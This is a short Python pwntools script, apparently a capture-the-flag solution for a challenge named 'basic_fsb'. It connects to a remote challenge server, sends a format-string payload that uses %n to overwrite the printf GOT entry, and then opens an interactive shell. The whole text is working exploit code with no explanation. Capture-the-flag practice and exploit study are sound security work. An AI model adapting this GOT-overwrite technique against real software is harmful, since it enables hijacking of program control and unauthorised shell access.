from pwn import *

r = remote('ctf.j0n9hyun.xyz', 3002)
e = ELF('./basic_fsb')

printf_got = e.got['printf']

print(hex(printf_got))

payload = ''
payload += p32(printf_got)
payload += "%134514096x%n"

r.recvuntil(': ')
r.sendline(payload)
r.interactive()
